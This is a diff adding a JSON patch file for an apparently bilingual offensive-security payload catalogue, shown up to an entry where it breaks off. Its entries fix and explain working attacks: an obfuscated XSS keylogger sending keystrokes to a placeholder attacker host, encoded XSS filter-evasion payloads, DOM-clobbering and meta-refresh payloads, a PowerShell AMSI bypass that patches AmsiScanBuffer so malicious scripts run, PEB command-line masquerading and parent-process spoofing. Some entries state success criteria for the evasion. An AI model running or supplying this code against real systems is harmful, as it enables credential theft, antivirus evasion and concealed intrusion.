@@ -1,0 +1,503 @@
+{
+  "schemaVersion": 1,
+  "entries": [
+    {
+      "id": "xss-keylogger",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "<script>var _0xa=[\"\\x6b\\x65\\x79\\x64\\x6f\\x77\\x6e\",\"\\x61\\x64\\x64\\x45\\x76\\x65\\x6e\\x74\\x4c\\x69\\x73\\x74\\x65\\x6e\\x65\\x72\"];document[_0xa[1]](_0xa[0],function(_0xb){new Image().src=\"http://{ATTACKER_HOST}/?k=\"+_0xb[_0xa[0]]})</script>",
+          "command": "<script>var _0xa=[\"\\x6b\\x65\\x79\",\"\\x61\\x64\\x64\\x45\\x76\\x65\\x6e\\x74\\x4c\\x69\\x73\\x74\\x65\\x6e\\x65\\x72\",\"\\x6b\\x65\\x79\\x64\\x6f\\x77\\x6e\"];document[_0xa[1]](_0xa[2],function(_0xb){new Image().src=\"http://{ATTACKER_HOST}/?k=\"+_0xb[_0xa[0]]})</script>",
+          "description": {
+            "zh": "以十六进制混淆监听 keydown 外发按键：事件名入表 _0xa[2]，键值取 event.key（_0xa[0]），修复原变体把事件名当属性读取恒为 undefined 的缺陷。判据：收集端收到 ?k=<按键> 请求且值非 undefined。",
+            "en": "Hex-obfuscated keydown listener exfiltrating event.key; the lookup table now separates the event name from the key property, fixing the variant that always beacons ?k=undefined. Success: the collector receives a ?k=<key> request whose value is never undefined."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "\\x6b\\x65\\x79",
+              "explanation": {
+                "zh": "hex编码的\"key\"：KeyboardEvent 键值属性名（event.key）",
+                "en": "Hex-encoded \"key\": the KeyboardEvent value property (event.key)"
+              },
+              "type": "encoding"
+            },
+            {
+              "part": "\\x6b\\x65\\x79\\x64\\x6f\\x77\\x6e",
+              "explanation": {
+                "zh": "hex编码的\"keydown\"：addEventListener 的事件类型参数",
+                "en": "Hex-encoded \"keydown\": the event type passed to addEventListener"
+              },
+              "type": "encoding"
+            },
+            {
+              "part": "document[_0xa[1]](_0xa[2],function(_0xb){...})",
+              "explanation": {
+                "zh": "数组方括号取值隐藏 addEventListener(\"keydown\",...) 真实调用",
+                "en": "Bracket access hides the real addEventListener(\"keydown\",...) call"
+              },
+              "type": "value"
+            },
+            {
+              "part": "_0xb[_0xa[0]]",
+              "explanation": {
+                "zh": "取 event.key 外带；原变体误用事件名当属性（event[\"keydown\"] 恒 undefined）",
+                "en": "Reads event.key for exfiltration; the old variant read the event name as a property (event[\"keydown\"] is always undefined)"
+              },
+              "type": "function"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "xss2-js",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 7,
+          "expectedCommand": "<script>\\x61\\x6c\\x65\\x72\\x74(1)</script>\n<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')</script>\n<script>eval('\\141\\154\\145\\162\\164\\50\\61\\51')</script>\n<script>eval(atob('YWxlcnQoMSk='))</script>\n<script>window['al'+'ert'](1)</script>\n<script>top['al'+'ert'](1)</script>\n<script>self['al'+'ert'](1)</script>\n<script>this['al'+'ert'](1)</script>\n<script>parent['al'+'ert'](1)</script>\n<script>frames['al'+'ert'](1)</script>\n<script>globalThis['al'+'ert'](1)</script>\n<script>window['\\x61\\x6c\\x65\\x72\\x74'](1)</script>\n<script>top['\\x61\\x6c\\x65\\x72\\x74'](1)</script>\n<script>self['\\x61\\x6c\\x65\\x72\\x74'](1)</script>\n<img src=x onerror=\\x61\\x6c\\x65\\x72\\x74(1)>\n<svg onload=\\x61\\x6c\\x65\\x72\\x74(1)>",
+          "command": "<script>\\u0061lert(1)</script>\n<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')</script>\n<script>eval('\\141\\154\\145\\162\\164\\50\\61\\51')</script>\n<script>eval(atob('YWxlcnQoMSk='))</script>\n<script>window['al'+'ert'](1)</script>\n<script>top['al'+'ert'](1)</script>\n<script>self['al'+'ert'](1)</script>\n<script>this['al'+'ert'](1)</script>\n<script>parent['al'+'ert'](1)</script>\n<script>frames['al'+'ert'](1)</script>\n<script>globalThis['al'+'ert'](1)</script>\n<script>window['\\x61\\x6c\\x65\\x72\\x74'](1)</script>\n<script>top['\\x61\\x6c\\x65\\x72\\x74'](1)</script>\n<script>self['\\x61\\x6c\\x65\\x72\\x74'](1)</script>\n<img src=x onerror=\\u0061lert(1)>\n<svg onload=\\u0061lert(1)>",
+          "title": {
+            "zh": "Unicode/Hex/八进制编码",
+            "en": "Unicode, Hex, and Octal Escape Injection"
+          },
+          "description": {
+            "zh": "标识符位置用 \\u 转义（\\x 仅在字符串字面量内合法，裸标识符处的 \\x 是 SyntaxError），配合字符串内 \\x/八进制、atob 与括号索引访问构造 alert 提交。判据：16 行逐行求值后执行即确认 JS 解码与标识符混淆可绕过检测，不再混入永不执行的字面量。",
+            "en": "Identifier positions use \\u escapes because a bare \\x outside a string literal is a SyntaxError; strings keep \\x and octal escapes alongside atob and bracket-index access. Success: all sixteen lines evaluate and confirm JS decoding plus identifier obfuscation evade detection, with no never-running literals left in the set."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<script",
+              "explanation": {
+                "zh": "脚本标签注入",
+                "en": "Script tag injection"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "\\u0061lert(1)",
+              "explanation": {
+                "zh": "标识符位置的 \\u 转义（合法）；\\x 仅限字符串内使用",
+                "en": "\\u identifier escape (legal); \\x is only valid inside string literals"
+              },
+              "type": "value"
+            },
+            {
+              "part": "\\x61...（eval 字符串内）",
+              "explanation": {
+                "zh": "字符串字面量内的 \\x 十六进制转义，eval 求值后执行",
+                "en": "\\x hex escapes inside a string literal, executed after eval"
+              },
+              "type": "value"
+            },
+            {
+              "part": "\\141",
+              "explanation": {
+                "zh": "八进制转义",
+                "en": "Octal escape"
+              },
+              "type": "value"
+            },
+            {
+              "part": "atob(",
+              "explanation": {
+                "zh": "Base64解码执行",
+                "en": "Base64 decode and run"
+              },
+              "type": "function"
+            },
+            {
+              "part": "YWxlcnQ",
+              "explanation": {
+                "zh": "Base64编码载荷",
+                "en": "Base64-encoded payload"
+              },
+              "type": "value"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "xss2-csp-meta",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "<meta http-equiv=\"refresh\" content=\"0;url=data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\">",
+          "description": {
+            "zh": "绕过 URL 内容检测：base64 文档跳转。失效条件：顶层导航到 data: 自 Chrome 60 起被拦截，预期阴性——console 报 Not allowed to navigate top frame to data URL，仅作历史行为教学对照。",
+            "en": "Base64 data: target for the refresh. Failure condition: top-frame navigation to data: URLs has been blocked since Chrome 60, so the success criteria is unreachable today; expect the console message Not allowed to navigate top frame to data URL. Historical teaching contrast only."
+          },
+          "effectiveness": "C"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "<meta http-equiv=\"refresh\" content=\"0;url=ja&#x76;ascript:alert(1)\">",
+          "description": {
+            "zh": "绕过 javascript: 明文：scheme 内字母用 HTML 实体编码（如 ja&#x76;ascript:），属性解析阶段即还原为 javascript:。失效条件：现代浏览器（Chrome/Edge/Firefox 2020+）不执行 meta refresh 到 javascript: 的导航；编码差异无从生效，判据当代不可达成，预期阴性，仅作历史行为教学对照。",
+            "en": "Entity-encodes a scheme letter so the attribute parser restores javascript:. Failure condition: modern browsers refuse javascript: targets for meta refresh entirely, so encoding differences never come into play; expect a silent no-op. Historical teaching contrast only."
+          },
+          "effectiveness": "C"
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "<meta http-equiv='refresh' content=0;url=javascript:alert(1)>",
+          "description": {
+            "zh": "绕过 content=\"...\" 引号形态匹配。失效条件：引号形态只影响规则匹配面，现代浏览器一律不执行 meta refresh 到 javascript: 的导航；判据当代不可达成，预期阴性，仅作历史行为教学对照。",
+            "en": "Unquoted content attribute evades quoted rule patterns. Failure condition: attribute quoting only changes the matching surface, while modern browsers ignore javascript: targets for meta refresh altogether; expect a no-op. Historical teaching contrast only."
+          },
+          "effectiveness": "C"
+        },
+        {
+          "area": "wafBypass",
+          "index": 3,
+          "expectedCommand": "<MeTa charset=utf-8 http-equiv=refresh content=\"0;URL=javascript:alert(1)\">",
+          "description": {
+            "zh": "绕过小写标签/属性与固定顺序规则。失效条件：大小写混淆只影响小写敏感规则，浏览器解析归一化后仍拒绝 meta refresh 到 javascript:；判据当代不可达成，预期阴性，仅作历史行为教学对照。",
+            "en": "Mixed case plus charset padding against lowercase-literal rules. Failure condition: case tricks die at browser normalization, and the normalized javascript: target is refused for meta refresh regardless; expect a no-op. Historical teaching contrast only."
+          },
+          "effectiveness": "C"
+        },
+        {
+          "area": "wafBypass",
+          "index": 4,
+          "expectedCommand": "<meta http-equiv=refresh content=\"0;url=javascript&#58;alert(1)\">",
+          "description": {
+            "zh": "绕过 javascript: 明文匹配：冒号实体化。失效条件：实体在属性解码阶段还原，现代浏览器对还原后的 javascript: 目标一律拒绝导航；判据当代不可达成，预期阴性，仅作历史行为教学对照。",
+            "en": "Entity-encodes the colon of javascript:. Failure condition: entities decode during attribute parsing and the restored scheme is refused as a meta refresh target; expect a no-op. Historical teaching contrast only."
+          },
+          "effectiveness": "C"
+        },
+        {
+          "area": "wafBypass",
+          "index": 5,
+          "expectedCommand": "<meta http-equiv=refresh content=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
+          "description": {
+            "zh": "绕过 URL 内容检测：目标 base64 化。失效条件：顶层导航到 data: 自 Chrome 60 起被拦截，预期阴性——console 报 Not allowed to navigate top frame to data URL，仅作历史行为教学对照。",
+            "en": "Base64-wraps the redirect target. Failure condition: top-frame navigation to data: URLs has been blocked since Chrome 60; expect the console message Not allowed to navigate top frame to data URL. Historical teaching contrast only."
+          },
+          "effectiveness": "C"
+        },
+        {
+          "area": "wafBypass",
+          "index": 6,
+          "expectedCommand": "<META HTTP-EQUIV=REFRESH CONTENT='0;URL=javascript:alert(1)'>",
+          "description": {
+            "zh": "绕过小写标签/属性匹配。失效条件：全大写只影响大小写敏感规则，浏览器归一化后仍拒绝 meta refresh 到 javascript:；判据当代不可达成，预期阴性，仅作历史行为教学对照。",
+            "en": "Uppercase everything to break lowercase rules. Failure condition: casing only matters to case-sensitive signatures, and the normalized javascript: target is refused for meta refresh anyway; expect a no-op. Historical teaching contrast only."
+          },
+          "effectiveness": "C"
+        },
+        {
+          "area": "wafBypass",
+          "index": 7,
+          "expectedCommand": "<meta http-equiv=refresh content=\"3;url=javascript:alert(document.cookie)\">",
+          "description": {
+            "zh": "绕过 0 秒跳转特征并延长驻留窃取时机。失效条件：延迟只改变触发时刻，现代浏览器对延迟触发的 javascript: 元刷新同样不执行；判据当代不可达成，预期阴性，仅作历史行为教学对照。",
+            "en": "Longer delay avoids 0-second signatures and widens the dwell window. Failure condition: the delay only shifts timing, and a delayed meta refresh to javascript: is refused exactly the same; expect a no-op. Historical teaching contrast only."
+          },
+          "effectiveness": "C"
+        },
+        {
+          "area": "wafBypass",
+          "index": 8,
+          "expectedCommand": "<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
+          "description": {
+            "zh": "以 meta refresh 导航到 javascript: URL；内存标记被设置且导航 URL 与 CSP 控制台被记录即确认活动 URL 边界。在隔离页面把 alert 替换为随机内存标记。失效条件：现代浏览器不执行 meta refresh 到 javascript: 的导航，内存标记永远不会被设置；预期阴性（导航不发生），保留作活动 URL 边界的历史对照。",
+            "en": "Navigate to a javascript: URL via meta refresh; the in-memory marker being set with the navigation URL and CSP console recorded confirms the active-URL boundary. Replace alert with a random in-memory marker on an isolated page. Failure condition: modern browsers refuse javascript: navigation targets for meta refresh, so the marker can never be set; expect no navigation at all. Historical contrast for the active-URL boundary only."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "xss2-dom-clobbering",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 10,
+          "expectedCommand": "<form id=cookie><input name=href value=\"//{ATTACKER_HOST}\"></form>",
+          "description": {
+            "zh": "构造 cookie.href 引用链（form id=cookie + input name=href）。规范边界：HTML 规范仅给 Window 的命名属性 getter 带 [LegacyOverrideBuiltIns]，Document 不带——document.cookie 是 Document.prototype 接口成员，命名元素压不过原型，现代浏览器读到的恒为原生值，原判据（document.cookie 求值为 form 元素）预期阴性。本条仅在 IE 时代 DOM 实现（命名元素直挂 document 实例属性）下成立，保留作规范对照；document 侧真实可行的覆盖见 V8 表单可达链（document.forms[...].y.value）。",
+            "en": "Builds a cookie.href chain via a form named cookie. Spec boundary: only Window named properties carry [LegacyOverrideBuiltIns]; document.cookie is a Document.prototype interface member, so named elements never shadow it in modern browsers and the original assertion expects a negative result. Valid only on IE-era DOM implementations; kept as spec contrast. Real document-side reachability lives in the form chain of V8."
+          },
+          "effectiveness": "C"
+        },
+        {
+          "area": "wafBypass",
+          "index": 11,
+          "expectedCommand": "<img name=domain src=x>",
+          "description": {
+            "zh": "name 属性生成 document.domain 引用。规范边界：document.domain 是 Document.prototype 接口成员（带原生存取器），命名元素不遮蔽它，现代浏览器判据（返回元素）预期阴性；仅 IE 时代 DOM 实现可见，保留作规范对照。真实覆盖面：window.name 可被命名 iframe 覆盖，document 侧走 V8 表单可达链。",
+            "en": "An img named domain tries to shadow document.domain. Spec boundary: document.domain is a Document.prototype interface member with a native accessor, so named elements never shadow it; modern browsers return the host string and the assertion expects a negative. IE-era DOM only; kept as spec contrast. Real surfaces are window.name or the V8 form chain."
+          },
+          "effectiveness": "C"
+        },
+        {
+          "area": "wafBypass",
+          "index": 12,
+          "expectedCommand": "<a id=write data-x=1></a><a id=write href=\"javascript:alert(1)\">",
+          "description": {
+            "zh": "覆盖 document.write 干扰净化流程。规范边界：document.write 是 Document.prototype 接口成员，a[id=write] 命名元素不遮蔽它，现代浏览器判据（write 不再是函数）预期阴性；仅 IE 时代 DOM 实现可见，保留作规范对照。",
+            "en": "Attempts to clobber document.write with anchors id=write. Spec boundary: document.write lives on Document.prototype, so named anchors cannot shadow it; modern browsers keep the native function and the assertion expects a negative. IE-era DOM only; kept as spec contrast."
+          },
+          "effectiveness": "C"
+        },
+        {
+          "area": "wafBypass",
+          "index": 13,
+          "expectedCommand": "<a id=\"cookie\"><a id=\"cookie\" href=\"https://{ATTACKER_HOST}\"> \n <a id=\"domain\"><a id=\"domain\" href=\"https://{ATTACKER_HOST}\"> \n <a id=\"URL\"><a id=\"URL\" href=\"https://{ATTACKER_HOST}\"> \n <a id=\"referrer\"><a id=\"referrer\" href=\"https://{ATTACKER_HOST}\"> \n <a id=\"title\"><a id=\"title\" href=\"https://{ATTACKER_HOST}\"> \n <a id=\"characterSet\"><a id=\"characterSet\" href=\"https://{ATTACKER_HOST}\"> \n <a id=\"contentType\"><a id=\"contentType\" href=\"https://{ATTACKER_HOST}\"> \n <a id=\"readyState\"><a id=\"readyState\" href=\"https://{ATTACKER_HOST}\"> \n <a id=\"lastModified\"><a id=\"lastModified\" href=\"https://{ATTACKER_HOST}\"> \n <a id=\"forms\"><a id=\"forms\" href=\"https://{ATTACKER_HOST}\"> \n <a id=\"links\"><a id=\"links\" href=\"https://{ATTACKER_HOST}\"> \n <a id=\"images\"><a id=\"images\" href=\"https://{ATTACKER_HOST}\"> \n <a id=\"scripts\"><a id=\"scripts\" href=\"https://{ATTACKER_HOST}\"> \n <a id=\"styleSheets\"><a id=\"styleSheets\" href=\"https://{ATTACKER_HOST}\"> \n <a id=\"doctype\"><a id=\"doctype\" href=\"https://{ATTACKER_HOST}\"> \n <a id=\"documentElement\"><a id=\"documentElement\" href=\"https://{ATTACKER_HOST}\">",
+          "description": {
+            "zh": "以 a[id] 全枚举尝试覆盖 document 命名属性（cookie/domain/URL/referrer/title/characterSet/contentType/readyState/lastModified/forms/links/images/scripts/styleSheets/doctype/documentElement）。规范边界：以上全部是 Document.prototype 接口成员，Document 命名属性 getter 不带 [LegacyOverrideBuiltIns]，现代浏览器逐项读取均为原生值，判据（读取到注入值）全部预期阴性；枚举集保留作规范对照教学，真实覆盖面见 V8 表单可达链。",
+            "en": "Enumerates a[id] anchors over document named properties (cookie, domain, URL, forms, links and more). Spec boundary: every listed name is a Document.prototype interface member and the Document named-property getter lacks [LegacyOverrideBuiltIns], so modern browsers return native values for all of them; the enumeration stays as a teaching contrast with negative expectations. Real reachability is the V8 form chain."
+          },
+          "effectiveness": "C",
+          "title": {
+            "zh": "覆盖document属性",
+            "en": "Document property override enumeration"
+          }
+        }
+      ]
+    },
+    {
+      "id": "amsi-bypass",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "Add-Type -Namespace Win32 -Name K -MemberDefinition '[DllImport(\"kernel32.dll\")] public static extern IntPtr LoadLibrary(string f); [DllImport(\"kernel32.dll\")] public static extern IntPtr GetProcAddress(IntPtr m, string p); [DllImport(\"kernel32.dll\")] public static extern bool VirtualProtect(IntPtr a, uint s, uint n, out uint o); [DllImport(\"kernel32.dll\")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);'",
+          "command": "Add-Type -Namespace W -Name K -MemberDefinition '[DllImport(\"kernel32.dll\")] public static extern IntPtr GetProcAddress(IntPtr m,string p);[DllImport(\"kernel32.dll\")] public static extern IntPtr LoadLibrary(string f);[DllImport(\"kernel32.dll\")] public static extern bool VirtualProtect(IntPtr a,uint s,uint n,out uint o);';$a=[W.K]::GetProcAddress([W.K]::LoadLibrary('amsi.dll'),'AmsiScanBuffer');[W.K]::VirtualProtect($a,6,0x40,[ref]0)|Out-Null;[System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3),0,$a,6)",
+          "description": {
+            "zh": "绕过 amsiInitFailed 单点检测：GetProcAddress/VirtualProtect 定位 amsi!AmsiScanBuffer 并把首 6 字节补丁为 mov eax,0x80070057; ret，AMSI 扫描恒返回 E_FAIL（调用方按扫描失败放行），无 .NET 反射特征。成功判据：补丁后加载已知恶意脚本无 AMSI 拦截且脚本正常执行。",
+            "en": "Locates amsi!AmsiScanBuffer via GetProcAddress/VirtualProtect and patches its first six bytes to mov eax,0x80070057; ret, making every scan fail open with no .NET reflection traces. Success: a known-malicious script loads and runs with no AMSI block afterwards."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "GetProcAddress([W.K]::LoadLibrary('amsi.dll'),'AmsiScanBuffer')",
+              "explanation": {
+                "zh": "定位补丁目标地址",
+                "en": "Resolve the patch target address"
+              },
+              "type": "function"
+            },
+            {
+              "part": "VirtualProtect($a,6,0x40,[ref]0)",
+              "explanation": {
+                "zh": "目标页改为 PAGE_EXECUTE_READWRITE 允许写入",
+                "en": "Flip the page to PAGE_EXECUTE_READWRITE for writing"
+              },
+              "type": "function"
+            },
+            {
+              "part": "[byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3)",
+              "explanation": {
+                "zh": "补丁字节：mov eax,0x80070057; ret（恒返回 E_FAIL）",
+                "en": "Patch bytes: mov eax,0x80070057; ret (always E_FAIL)"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "Marshal]::Copy(...,0,$a,6)",
+              "explanation": {
+                "zh": "把补丁字节写入内存完成闭环",
+                "en": "Copy the bytes into memory to finish the loop"
+              },
+              "type": "function"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "evasion-process-masq",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "Add-Type -Namespace Win32 -Name NtDll -MemberDefinition '[DllImport(\"ntdll.dll\")] public static extern int NtQueryInformationProcess(IntPtr h, int c, byte[] bi, int l, out int rl);'",
+          "command": "$src='using System;using System.Runtime.InteropServices;public class M{[DllImport(\"ntdll.dll\")]public static extern int NtQueryInformationProcess(IntPtr h,int c,byte[] bi,int l,out int rl);}';Add-Type -TypeDefinition $src -Name M -Namespace W;$bi=New-Object byte[] 48;$rl=0;[void][W.M]::NtQueryInformationProcess([System.Diagnostics.Process]::GetCurrentProcess().Handle,0,$bi,48,[ref]$rl);$peb=[BitConverter]::ToInt64($bi,8);$pp=[Runtime.InteropServices.Marshal]::ReadIntPtr([IntPtr]$peb,0x20);$fake='C:\\Windows\\System32\\notepad.exe -masqueraded';[Runtime.InteropServices.Marshal]::WriteInt64([IntPtr]$pp,0x70,$fake.Length*2);[Runtime.InteropServices.Marshal]::WriteInt16([IntPtr]$pp,0x72,$fake.Length*2+2);$buf=[Runtime.InteropServices.Marshal]::ReadIntPtr([IntPtr]$pp,0x78);[Runtime.InteropServices.Marshal]::Copy([System.Text.Encoding]::Unicode.GetBytes($fake),0,$buf,$fake.Length*2);'wmi-cmdline-now='+(Get-CimInstance Win32_Process -Filter (\"ProcessId=$PID\")).CommandLine",
+          "description": {
+            "zh": "绕过跨进程镜像一致性校验：NtQueryInformationProcess 取 PEB 基址，覆写 ProcessParameters+0x70 的 CommandLine UNICODE_STRING（Length 0x70、MaximumLength 0x72、Buffer 0x78，x64 偏移），遥测读到伪装值。成功判据：命令尾 Get-CimInstance 返回的 CommandLine 为伪装的 notepad.exe 形态。",
+            "en": "Rewrites the CommandLine UNICODE_STRING inside the PEB (x64 offsets 0x70/0x72/0x78) after resolving it via NtQueryInformationProcess, so telemetry reads a masqueraded notepad.exe value. Success: the trailing Get-CimInstance shows the masqueraded command line."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "NtQueryInformationProcess(...,0,$bi,48,[ref]$rl)",
+              "explanation": {
+                "zh": "取 PBI，偏移 8 为 PEB 基址",
+                "en": "Fetch the PBI; offset 8 holds the PEB base"
+              },
+              "type": "function"
+            },
+            {
+              "part": "ReadIntPtr([IntPtr]$peb,0x20)",
+              "explanation": {
+                "zh": "PEB→ProcessParameters（x64 偏移 0x20）",
+                "en": "PEB to ProcessParameters (x64 offset 0x20)"
+              },
+              "type": "function"
+            },
+            {
+              "part": "WriteInt64([IntPtr]$pp,0x70,$fake.Length*2)",
+              "explanation": {
+                "zh": "覆写 CommandLine.Length（0x70）与 MaximumLength（0x72）",
+                "en": "Overwrite CommandLine.Length (0x70) and MaximumLength (0x72)"
+              },
+              "type": "function"
+            },
+            {
+              "part": "Copy(Unicode.GetBytes($fake),0,$buf,...)",
+              "explanation": {
+                "zh": "覆写 CommandLine.Buffer（0x78）内容为伪装形态",
+                "en": "Overwrite the CommandLine.Buffer (0x78) contents with the masqueraded form"
+              },
+              "type": "function"
+            }
+          ]
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class P{[DllImport(\"kernel32.dll\",SetLastError=true)]public static extern IntPtr OpenProcess(uint a,bool i,int p);[DllImport(\"kernel32.dll\")]public static extern bool InitializeProcThreadAttributeList(IntPtr l,int c,int f,ref IntPtr s);[DllImport(\"kernel32.dll\")]public static extern bool UpdateProcThreadAttribute(IntPtr l,uint f,IntPtr a,ref IntPtr v,IntPtr s,IntPtr pr,IntPtr r);[DllImport(\"kernel32.dll\",CharSet=CharSet.Unicode)]public static extern bool CreateProcess(string an,string cl,IntPtr pa,IntPtr ta,bool ih,uint f,IntPtr e,string d,ref SIEX si,out PI pi);[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]public struct SI{public int cb;public string r1,r2,r3;public int x,y,xs,ys,xc,yc,fa,fl;public short sw,cr;public IntPtr rr,ii,oo,ee;}[StructLayout(LayoutKind.Sequential)]public struct SIEX{public SI si;public IntPtr al;}[StructLayout(LayoutKind.Sequential)]public struct PI{public IntPtr hp,ht;public int pid,tid;}}'",
+          "command": "$src='using System;using System.Runtime.InteropServices;public class P{[DllImport(\"kernel32.dll\",SetLastError=true)]public static extern IntPtr OpenProcess(uint a,bool i,int p);[DllImport(\"kernel32.dll\",SetLastError=true)]public static extern bool InitializeProcThreadAttributeList(IntPtr l,int c,int f,ref IntPtr s);[DllImport(\"kernel32.dll\",SetLastError=true)]public static extern bool UpdateProcThreadAttribute(IntPtr l,uint f,IntPtr a,ref IntPtr v,IntPtr s,IntPtr pr,IntPtr r);[DllImport(\"kernel32.dll\",CharSet=CharSet.Unicode,SetLastError=true)]public static extern bool CreateProcess(string an,string cl,IntPtr pa,IntPtr ta,bool ih,uint f,IntPtr e,string d,IntPtr si,out PI pi);[StructLayout(LayoutKind.Sequential)]public struct PI{public IntPtr hp,ht;public int pid,tid;}}';Add-Type -TypeDefinition $src -Name P -Namespace W;$h=(Get-Process explorer)[0].Handle;$al=[Runtime.InteropServices.Marshal]::AllocHGlobal(128);$s=[IntPtr]128;[void][P]::InitializeProcThreadAttributeList($al,1,0,[ref]$s);[void][P]::UpdateProcThreadAttribute($al,0,[IntPtr]0x00020000,[ref]$h,[IntPtr]8,[IntPtr]::Zero,[IntPtr]::Zero);$ss=[Runtime.InteropServices.Marshal]::AllocHGlobal(104);[Runtime.InteropServices.Marshal]::WriteInt32($ss,0,104);[Runtime.InteropServices.Marshal]::WriteIntPtr($ss,96,$al);$pi=New-Object 'W.P+PI';[void][P]::CreateProcess($null,'cmd /c ping -n 4 127.0.0.1 > NUL',[IntPtr]::Zero,[IntPtr]::Zero,$false,0x00080000,[IntPtr]::Zero,$null,$ss,[ref]$pi);Start-Sleep -Milliseconds 500;$gp=(Get-CimInstance Win32_Process -Filter (\"ProcessId=\"+$pi.pid)).ParentProcessId;'child='+$pi.pid+' parent='+(Get-Process -Id $gp).ProcessName",
+          "description": {
+            "zh": "绕过异常父子关系检测（powershell→cmd 类规则）：以 InitializeProcThreadAttributeList+UpdateProcThreadAttribute(0x00020000) 绑定 explorer 句柄，再以 EXTENDED_STARTUPINFO_PRESENT 调 CreateProcess 派生驻留探测进程。成功判据：输出 child=<pid> parent=explorer（Sysmon E1 ParentImage 为 explorer.exe）。",
+            "en": "Spawns the probe from a resident explorer.exe by building a full attribute list, binding the PROC_THREAD_ATTRIBUTE_PARENT_PROCESS (0x00020000) handle, and calling CreateProcess with EXTENDED_STARTUPINFO_PRESENT. Success: output shows child=<pid> parent=explorer (Sysmon E1 ParentImage is explorer.exe)."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "(Get-Process explorer)[0].Handle",
+              "explanation": {
+                "zh": "取常驻 explorer 进程句柄",
+                "en": "Take the resident explorer process handle"
+              },
+              "type": "function"
+            },
+            {
+              "part": "UpdateProcThreadAttribute($al,0,[IntPtr]0x00020000,[ref]$h,...)",
+              "explanation": {
+                "zh": "绑定 PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 属性",
+                "en": "Bind the PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute"
+              },
+              "type": "function"
+            },
+            {
+              "part": "WriteInt32($ss,0,104);WriteIntPtr($ss,96,$al)",
+              "explanation": {
+                "zh": "组装 STARTUPINFOEX（cb=104，lpAttributeList 在 +96）",
+                "en": "Assemble STARTUPINFOEX (cb=104, lpAttributeList at +96)"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "CreateProcess(...,0x00080000,...)",
+              "explanation": {
+                "zh": "EXTENDED_STARTUPINFO_PRESENT 启动子进程",
+                "en": "Launch with EXTENDED_STARTUPINFO_PRESENT"
+              },
+              "type": "payload"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "evasion-ppid-spoof",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "$hParent=[PpidSpoof]::OpenProcess(0x1FFFFF,$false,{LAB_PARENT_PID})",
+          "command": "$src='using System;using System.Runtime.InteropServices;public class P{[DllImport(\"kernel32.dll\",SetLastError=true)]public static extern IntPtr OpenProcess(uint a,bool i,int p);[DllImport(\"kernel32.dll\",SetLastError=true)]public static extern bool InitializeProcThreadAttributeList(IntPtr l,int c,int f,ref IntPtr s);[DllImport(\"kernel32.dll\",SetLastError=true)]public static extern bool UpdateProcThreadAttribute(IntPtr l,uint f,IntPtr a,ref IntPtr v,IntPtr s,IntPtr pr,IntPtr r);[DllImport(\"kernel32.dll\",CharSet=CharSet.Unicode,SetLastError=true)]public static extern bool CreateProcess(string an,string cl,IntPtr pa,IntPtr ta,bool ih,uint f,IntPtr e,string d,IntPtr si,out PI pi);[StructLayout(LayoutKind.Sequential)]public struct PI{public IntPtr hp,ht;public int pid,tid;}}';Add-Type -TypeDefinition $src -Name P -Namespace W;$h=[P]::OpenProcess(0x1FFFFF,$false,{LAB_PARENT_PID});$al=[Runtime.InteropServices.Marshal]::AllocHGlobal(128);$s=[IntPtr]128;[void][P]::InitializeProcThreadAttributeList($al,1,0,[ref]$s);[void][P]::UpdateProcThreadAttribute($al,0,[IntPtr]0x00020000,[ref]$h,[IntPtr]8,[IntPtr]::Zero,[IntPtr]::Zero);$ss=[Runtime.InteropServices.Marshal]::AllocHGlobal(104);[Runtime.InteropServices.Marshal]::WriteInt32($ss,0,104);[Runtime.InteropServices.Marshal]::WriteIntPtr($ss,96,$al);$pi=New-Object 'W.P+PI';[void][P]::CreateProcess($null,'cmd /c ping -n 4 127.0.0.1 > NUL',[IntPtr]::Zero,[IntPtr]::Zero,$false,0x00080000,[IntPtr]::Zero,$null,$ss,[ref]$pi);Start-Sleep -Milliseconds 500;$gp=(Get-CimInstance Win32_Process -Filter (\"ProcessId=\"+$pi.pid)).ParentProcessId;'child='+$pi.pid+' ppid='+$gp+' (expected {LAB_PARENT_PID})",
+          "description": {
